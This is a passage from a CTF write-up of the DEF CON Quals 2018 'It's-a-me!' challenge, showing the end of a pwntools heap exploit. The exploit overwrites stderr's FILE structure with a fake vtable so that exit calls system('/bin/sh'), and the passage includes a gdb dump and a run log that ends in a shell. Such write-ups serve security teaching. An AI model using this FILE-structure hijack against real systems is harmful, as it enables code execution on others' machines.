+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>                              <span class="c1"># fake _IO_file_jumps
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3c6790</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3c49c0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>			
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3c5608</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">)</span>	<span class="c1"># fake _IO_file_jumps pointer
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>We’re overwriting the <code class="language-plaintext highlighter-rouge">_IO_file</code> struct for <code class="language-plaintext highlighter-rouge">stderr</code>, which will now look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/30gx stderr
+0x7ffff783a540 &lt;_IO_2_1_stderr_&gt;:      0x0068732f6e69622f	0x0000000000000001  &lt;= flags ("/bin/sh")
+0x7ffff783a550 &lt;_IO_2_1_stderr_+16&gt;:	0x0000000000000002	0x0000000000000003
+0x7ffff783a560 &lt;_IO_2_1_stderr_+32&gt;:	0x0000000000000004	0x0000000000000005
+0x7ffff783a570 &lt;_IO_2_1_stderr_+48&gt;:	0x0000000000000006	0x0000000000000007
+0x7ffff783a580 &lt;_IO_2_1_stderr_+64&gt;:	0x0000000000000008	0x0000000000000000
+0x7ffff783a590 &lt;_IO_2_1_stderr_+80&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff783a5a0 &lt;_IO_2_1_stderr_+96&gt;:	0x0000000000000000	0x0000000000000000  &lt;= fake _IO_file_jumps
+0x7ffff783a5b0 &lt;_IO_2_1_stderr_+112&gt;:	0x0000000000000000	0xffffffffffffffff
+0x7ffff783a5c0 &lt;_IO_2_1_stderr_+128&gt;:	0x0000000000000000	0x00007ffff783b790
+0x7ffff783a5d0 &lt;_IO_2_1_stderr_+144&gt;:	0xffffffffffffffff	0x0000000000000000
+0x7ffff783a5e0 &lt;_IO_2_1_stderr_+160&gt;:	0x00007ffff78399c0	0x0000000000000000
+0x7ffff783a5f0 &lt;_IO_2_1_stderr_+176&gt;:	0x0000000000000000	0x0000000000000000
+0x7ffff783a600 &lt;_IO_2_1_stderr_+192&gt;:	0x0000000000000000	0x00007ffff74ba390  &lt;= pointer to system
+0x7ffff783a610 &lt;_IO_2_1_stderr_+208&gt;:	0x0000000000000000	0x00007ffff783a5a8  &lt;= fake _IO_file_jumps pointer</code></pre></figure>
+
+<p>Overwriting the address for <code class="language-plaintext highlighter-rouge">_IO_file_jumps</code> in <code class="language-plaintext highlighter-rouge">stderr</code> pointing back into itself (just reused the space to put the needed pointers in one write).</p>
+
+<p>When we now exit the binary, it will try to clean up the open file handles, calling <code class="language-plaintext highlighter-rouge">_IO_fflush</code> on our <code class="language-plaintext highlighter-rouge">stderr</code> file struct.</p>
+
+<p>This will try to call <code class="language-plaintext highlighter-rouge">_IO_SYNC(fp)</code> (which is <code class="language-plaintext highlighter-rouge">_IO_file_jumps + 0x60</code>), so it will call the function located at offset <code class="language-plaintext highlighter-rouge">0x60</code> from <code class="language-plaintext highlighter-rouge">_IO_file_jumps</code> (where we just put the address of <code class="language-plaintext highlighter-rouge">system</code>). <code class="language-plaintext highlighter-rouge">fp</code> points to the top of the <code class="language-plaintext highlighter-rouge">_IO_file</code> struct, where we put the string <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+
+<p>And this will finally just call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Call exit to trigger _IO_flush which will call fake vtable+0x60 =&gt; system('/bin/sh')"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"E"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/vagrant/Challenges/dc18/mario/mario'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/vagrant/Challenges/dc18/mario/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 83b1db91.quals2018.oooverflow.io on port 31337: Done
+[+] Starting local process './pow.py': pid 2130
+[*] Stopped process './pow.py' (pid 2130)
+[*] Create good user
+[*] Create first offending user
+[*] Order pineapple pizzas to get this user banned
+[*] Cook offending pizza to free explanation buffer
+[*] Withdraw to get heap leak from mario (from freed explanation)
+[*] HEAPLEAK               : 0x5644af8576c0
+[*] Create another offending user
+[*] Order pineapple pizzas to get this user banned
+[*] Cook pizzas to create free fastbin chunk above user table
+[*] Overwrite user name (of YAB) with a pointer to a libc address on the heap
+[*] Leak libc address from offending user
+[*] LIBC leak              : 0x7f8999d87bf8
+[*] LIBC                   : 0x7f89999c3000
+[*] Create another user and order offending pizzas
+[*] Login with first user (still good) and offend mario
+[*] Explanation buffer points to currently freed fastbin. Overwrite FD pointer to point above stderr _IO_file structure.
+[*] Create another customer and cook a pizza to allocate 0x70 fastbin to get fake FD pointer into fastbin list
+[*] Login with user waiting with offending order
+[*] Cook offending order. This will alocate pointer to stderr and overwrite it with As
+[*] Use explanation to overwrite stderr _IO_file
+[*] Call exit to trigger _IO_flush which will call fake vtable+0x60 =&gt; system('/bin/sh')
+[*] Switching to interactive mode
+Ooookay, ciao!
+$ cat flag
+OOO{cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Defcon Quals 2018 - It's-a-me!&amp;url=https://kileak.github.io/ctf/2018/defconquals18-itsame/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/defconquals18-itsame/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/defconquals18-itsame';
+        var disqus_title = 'Defcon Quals 2018 - It's-a-me!';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/defconquals18-itsame';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
